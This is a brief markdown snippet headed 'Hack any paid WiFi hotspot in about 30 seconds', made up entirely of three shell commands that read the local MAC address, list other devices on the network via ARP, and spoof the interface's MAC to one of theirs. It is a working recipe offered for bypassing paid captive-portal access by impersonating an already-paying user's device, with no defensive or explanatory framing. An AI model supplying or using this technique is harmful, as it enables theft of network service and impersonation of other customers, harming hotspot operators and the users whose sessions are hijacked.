# Assorted Snippits

**Hack any paid WiFi hotspot in about 30 seconds**
```
ifconfig en1 | grep ether
arp -a
sudo ifconfig en1 ether [mac address to spoof]
```
